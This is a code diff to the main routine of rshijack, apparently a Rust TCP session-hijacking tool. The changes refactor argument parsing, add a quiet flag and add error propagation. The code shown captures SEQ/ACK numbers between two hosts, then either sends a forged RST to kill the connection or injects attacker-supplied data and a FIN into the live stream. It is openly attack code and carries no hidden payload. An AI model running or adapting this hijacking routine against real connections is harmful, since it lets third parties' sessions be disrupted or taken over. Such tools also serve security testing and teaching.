@@ -1,6 +1,5 @@
 extern crate clap;
 extern crate env_logger;
-extern crate pcap;
 extern crate pktparse;
 extern crate nom;
 extern crate pnet;
@@ -12,14 +11,12 @@ pub mod net;
 
 mod errors {
     use std;
-    use pcap;
 
     error_chain! {
         foreign_links {
             Io(std::io::Error);
             ParseInt(std::num::ParseIntError);
             ParseAddress(std::net::AddrParseError);
-            Pcap(pcap::Error);
         }
     }
 }
@@ -34,17 +31,18 @@ use net::TcpFlags;
 
 
 fn run() -> Result<()> {
-    if std::env::var("RUST_LOG").is_err() {
+    let arguments = Arguments::parse().chain_err(|| "failed to parse arguments")?;
+
+    if arguments.quiet == 0 && std::env::var("RUST_LOG").is_err() {
         std::env::set_var("RUST_LOG", "rshijack=debug");
     }
 
     env_logger::init();
 
-    let arguments = Arguments::parse().chain_err(|| "failed to parse arguments")?;
     trace!("arguments: {:?}", arguments);
 
     println!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
-    println!("(To speed things up, try making some traffic between the two, /msg person asdf\n");
+    println!("(To speed things up, try making some traffic between the two, /msg person asdf)");
 
     let (mut seq, ack, offset) = net::getseqack(&arguments.interface, &arguments.src, &arguments.dst)?;
     println!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", seq, ack);
@@ -55,7 +53,7 @@ fn run() -> Result<()> {
     seq += offset as u32;
 
     if arguments.reset {
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::RST, seq, 0, &[]);
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::RST, seq, 0, &[])?;
         println!("[+] Connection has been reset");
         return Ok(());
     }
@@ -64,7 +62,7 @@ fn run() -> Result<()> {
         info!("Sending 1kb of null bytes to prevent desync");
 
         let data = vec![0; 1024];
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data)?;
         seq += data.len() as u32;
     }
 
@@ -80,13 +78,13 @@ fn run() -> Result<()> {
             break;
         }
 
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data[..len]);
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data[..len])?;
 
         // bump seq afterwards
         seq += len as u32;
     }
 
-    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::FIN, seq, ack, &[]);
+    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::FIN, seq, ack, &[])?;
     println!("Exiting..");
 
     Ok(())
